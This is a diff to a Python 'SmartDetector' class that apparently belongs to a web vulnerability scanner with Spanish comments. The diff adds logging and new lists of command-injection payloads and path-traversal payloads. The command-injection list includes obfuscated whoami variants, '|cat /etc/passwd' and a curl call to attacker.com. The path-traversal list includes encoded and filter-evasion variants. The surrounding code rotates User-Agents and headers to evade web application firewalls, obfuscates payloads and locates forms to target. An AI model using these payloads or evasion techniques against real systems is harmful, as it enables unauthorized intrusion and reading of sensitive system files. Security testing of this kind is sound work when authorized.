@@ -1,3 +1,4 @@
+import logging
 import random
 import time
 import base64
@@ -8,6 +9,14 @@ import re
 
 class SmartDetector:
     def __init__(self):
+        # Configurar logging
+        self.logger = logging.getLogger('SmartDetector')
+        self.logger.setLevel(logging.INFO)
+        handler = logging.StreamHandler()
+        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        handler.setFormatter(formatter)
+        self.logger.addHandler(handler)
+        
         # User-Agents para rotación
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
@@ -176,6 +185,56 @@ class SmartDetector:
             "setTimeout('al'+'ert(1)')"
         ]
         
+        # Command Injection payloads
+        self.command_injection_payloads = {
+            "basic": [
+                ";whoami",
+                "&dir", 
+                "|cat /etc/passwd",
+                "$(id)"
+            ],
+            "alternative_separators": [
+                "&&whoami",
+                "||id", 
+                ";sleep 5",
+                "&timeout 5"
+            ],
+            "obfuscated": [
+                ";`w``h``o``a``m``i`",
+                "$(sleep${IFS}5)",
+                ";ECHO is on.|whoami",
+                ";uname${IFS}-a"
+            ],
+            "advanced": [
+                ";curl${IFS}http://attacker.com",
+                "&tasklist",
+                ";ping${IFS}-c${IFS}5${IFS}127.0.0.1",
+                "|net users"
+            ]
+        }
+
+        # Path Traversal payloads  
+        self.path_traversal_payloads = {
+            "basic": [
+                "../etc/passwd",
+                "..\\windows\\system32\\cmd.exe",
+                "/etc/passwd", 
+                "C:\\Windows\\System32\\drivers\\etc\\hosts"
+            ],
+            "encoded": [
+                "%2e%2e%2fetc%2fpasswd",
+                "%252e%252e%252fetc%252fpasswd",
+                "..%5cwindows%5csystem32",
+                "%c0%ae%c0%ae%c0%af"
+            ],
+            "filter_evasion": [
+                "....//....//etc/passwd",
+                ".././.././etc/passwd",
+                "..%c0%afetc%c0%afpasswd", 
+                "../../../../../../../../../../etc/passwd%00"
+            ]
+        }
+
         # Contador para rotación de evasión WAF
         self.payload_counter = 0
         
@@ -184,17 +243,48 @@ class SmartDetector:
         
     async def get_next_user_agent_and_headers(self) -> Dict:
         """Obtiene el siguiente User-Agent y headers para evasión WAF"""
-        user_agent = random.choice(self.user_agents)
-        
-        # Seleccionar 2-3 headers aleatorios para evasión WAF
-        evasion_headers = {}
-        for header in random.sample(self.waf_evasion_headers, random.randint(2, 3)):
-            evasion_headers.update(header)
+        try:
+            # Log start of operation
+            self.logger.info("Iniciando rotación de User-Agent y headers...")
             
-        return {
-            "user-agent": user_agent,
-            **evasion_headers
-        }
+            user_agent = random.choice(self.user_agents)
+            self.logger.info(f"User-Agent seleccionado: {user_agent[:30]}...")
+            
+            # Seleccionar 2-3 headers aleatorios para evasión WAF
+            evasion_headers = {}
+            selected_headers = random.sample(self.waf_evasion_headers, random.randint(2, 3))
+            
+            # Log header selection process
+            self.logger.debug(f"Seleccionados {len(selected_headers)} headers para evasión")
+            
+            for header in selected_headers:
+                if not isinstance(header, dict):
+                    self.logger.warning(f"Header inválido encontrado: {header}")
+                    continue
+                    
+                try:
+                    # Get first key-value pair from header dict
+                    key = list(header.keys())[0]
+                    value = header[key]
+                    evasion_headers[key] = value
+                    self.logger.debug(f"Header agregado: {key}")
+                except (IndexError, KeyError) as e:
+                    self.logger.error(f"Error procesando header: {e}")
+                    continue
+            
+            self.logger.info(f"Headers de evasión configurados: {len(evasion_headers)} headers")
+            
+            return {
+                "user-agent": user_agent,
+                **evasion_headers
+            }
+            
+        except Exception as e:
+            self.logger.error(f"Error en get_next_user_agent_and_headers: {str(e)}")
+            # Return default headers in case of error
+            return {
+                "user-agent": self.user_agents[0]
+            }
         
     async def should_rotate_identity(self) -> bool:
         """Determina si es momento de rotar la identidad"""
@@ -203,7 +293,9 @@ class SmartDetector:
         
     async def detect_interactive_elements(self, page) -> List:
         """Detecta elementos interactivos usando múltiples enfoques"""
-        return await page.evaluate(f"""
+        self.logger.info("Iniciando detección de elementos interactivos...")
+        
+        elements = await page.evaluate(f"""
             () => {{
                 const elements = [];
                 const allElements = document.querySelectorAll('*');
@@ -242,9 +334,17 @@ class SmartDetector:
             }}
         """)
         
+        self.logger.info(f"Encontrados {len(elements)} elementos interactivos")
+        for element in elements[:3]:  # Mostrar solo los primeros 3
+            self.logger.info(f"Elemento detectado: {element['tag']} - Score: {element['score']} - Texto: {element['text'][:30]}")
+        
+        return elements
+        
     async def detect_forms(self, page) -> List:
         """Detecta formularios incluso si no usan la etiqueta form"""
-        return await page.evaluate("""
+        self.logger.info("Iniciando detección de formularios...")
+        
+        forms = await page.evaluate("""
             () => {
                 const results = [];
                 
@@ -309,8 +409,23 @@ class SmartDetector:
             }
         """)
         
+        standard_forms = len([f for f in forms if f['type'] == 'standard_form'])
+        pseudo_forms = len([f for f in forms if f['type'] == 'pseudo_form'])
+        
+        self.logger.info(f"Formularios detectados: {len(forms)} total")
+        self.logger.info(f"- Formularios estándar: {standard_forms}")
+        self.logger.info(f"- Pseudo-formularios: {pseudo_forms}")
+        
+        for form in forms:
+            self.logger.debug(f"Form tipo: {form['type']}, Inputs: {len(form['inputs'])}, " 
+                            f"Action: {form.get('action', 'No definido')}")
+        
+        return forms
+        
     def obfuscate_payload(self, payload: str, level: int = 1) -> str:
         """Aplica técnicas de ofuscación a un payload"""
+        self.logger.info(f"Ofuscando payload (nivel {level}): {payload[:30]}...")
+        
         if level <= 0:
             return payload
             
@@ -332,12 +447,17 @@ class SmartDetector:
             lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e")
         ]
         
-        # Aplicar técnicas aleatorias según nivel
         result = payload
+        techniques_applied = []
+        
         for _ in range(level):
             technique = random.choice(techniques[:min(level*3, len(techniques))])
             result = technique(result)
+            techniques_applied.append(technique.__name__)
             
+        self.logger.info(f"Técnicas aplicadas: {', '.join(techniques_applied)}")
+        self.logger.debug(f"Resultado ofuscación: {result[:50]}...")
+        
         return result
         
     async def log_response_status(self, response, context: str = "") -> Dict:
@@ -372,4 +492,4 @@ class SmartDetector:
             elif status >= 500:
                 log_entry["details"] = "Error del servidor - Posible vulnerabilidad o sobrecarga"
                 
-        return log_entry 
+        return log_entry
